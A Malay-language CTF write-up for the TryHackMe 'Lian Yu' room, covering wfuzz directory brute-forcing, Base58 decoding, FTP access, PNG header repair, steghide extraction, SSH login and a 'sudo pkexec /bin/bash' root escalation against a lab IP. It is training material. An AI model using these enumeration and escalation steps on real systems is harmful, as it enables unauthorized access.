---
title: "Lian Yu (TryHackMe)"
date: 2020-08-26
layout: single
permalink: /ctf-writeups/lianyu-thm/
tags: [Hacking, CTF]
---

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/lianyu.png){:.align-center}

# 1) What is the Web Directory you found?

Hint : in number

Kita lakukan *bruteforcing directory*.Gunakan *dirbuster*.

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/webdirlianyu.png){: .align-center}

# 2) What is the file name you found?

Hint : How would you search a file/directory by extension?

Pada source code web directory sebelum ini,kita menjumpai satu lagi hint iaitu *.ticket*

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/lianyupagesource.png){: .align-center}

Sekali lagi,kita akan lakukan *bruteforcing directory*.Run *wfuzz*

- wfuzz -w /usr/share/wordlists/dirbuster/ directory-list-2.3-medium.txt -u http://10.10.67.92/island/2100/ FUZZ.ticket --hc 404

```
Target: http://10.10.67.92/island/2100/FUZZ.ticket
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                     
===================================================================

000010444:   200        6 L      11 W     71 Ch       "gre*****row"
```

# 3) What is the FTP Password?

hint : Looks like base? https://gchq.github.io/CyberChef/

Pada page http://10.10.67.92/island/2100/ gre*****row.ticket ,terdapat encoded string.

```
This is just a token to get into Queen's Gambit(Ship)


RTy8yh******
```

Kali ini kita masuk pula kepada encoding dan decoding.Gunakan CyberChef https://gchq.github.io/CyberChef/ .
Decode menggunakan format Base58 dan kita akan dapat FTP password

```
input  : RTy8yh******
output : !#t****0d
```

# 4) What is the file name with SSH password?

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/nmaplianyu.png){: .align-center}

Daripada nmap scan itu,port 21 iaitu ftp adalah open.Namun,kita perlukan username untuk login.Pada source code */island/* web directory,
kita menjumpai sesuatu.

```html
<!DOCTYPE html>
<html>
<body>
<style>
 
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>





<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->






<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vi******e</style></h2>

</body>
</html>
```

Maka vi******e adalah username.

```
jacobians@reavz:~$ ftp 10.10.67.92
Connected to 10.10.67.92.
220 (vsFTPd 3.0.2)
Name (10.10.67.92:jacobians): vi******e
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 .
drwxr-xr-x    4 0        0            4096 May 01 05:38 ..
-rw-------    1 1001     1001           44 May 01 07:13 .bash_history
-rw-r--r--    1 1001     1001          220 May 01 05:38 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01 05:38 .bashrc
-rw-r--r--    1 0        0            2483 May 01 07:07 .other_user
-rw-r--r--    1 1001     1001          675 May 01 05:38 .profile
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
226 Directory send OK.
ftp> mget *
```

Salah satu daripada gambar itu telah corrupted iaitu *Leave_me_alone.png* :

```
jacobians@reavz:~$ file *
aa.jpg:             JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1200x1600, components 3
Leave_me_alone.png: data
Queen's_Gambit.png: PNG image data, 1280 x 720, 8-bit/color RGBA, non-interlaced
```

Sekarang kita akan masuk pula kepada Steganography

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/xxdlianyu.png){: .align-center}

Nampaknya PNG header telah hilang.Kita perlu lengkapkan ia dalam bentuk hex format

```
jacobians@reavz:~$ printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | dd conv=notrunc of=Leave_me_alone.png bs=1
```

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/pngheaderlianyu.png){: .align-center}

Kita boleh lihat bahawa gambar itu berubah apabila PNG header telah lengkap.

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/passlianyu.png){: .align-center}

Password : password

Password ini digunakan untuk decode *aa.jpg* kerana terdapat data yang telah di *embedded* didalamnya.

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/aalianyu.png){: .align-center}

Extract dan unzip ss.zip file

- *steghide --extract -sf aa.jpg*
- *unzip ss.zip*

```
jacobians@reavz:~$ unzip ss.zip 
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado   
jacobians@reavz:~$ cat s***o 
M******an                
jacobians@reavz:~$ cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

Maka file yang mengandungi ssh password adalah s***o

# 5) user.txt

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/bashhistorylianyu.png){: .align-center}

Kita hanya ada password tetapi tiada username.Didalam ftp tadi,terdapat *.other_user* file yang didalamnya :

```
jacobians@reavz:~$ cat .other_user 
S***e Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later
assigned to Camp Washington where he had been promoted to the rank of major.
```

Username : S***e

- ssh s***e@10.10.67.92

# 6) root.txt

Untuk privesc pula,kita akan check sudo privileges disebabkan kita mempunyai s***e password.

![enter image description here](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/images/sudolianyu.png){: .align-center}

Nampaknya ia sangat "straight forward".

- *sudo /usr/bin/pkexec /bin/bash*



HAPPY HACKING !


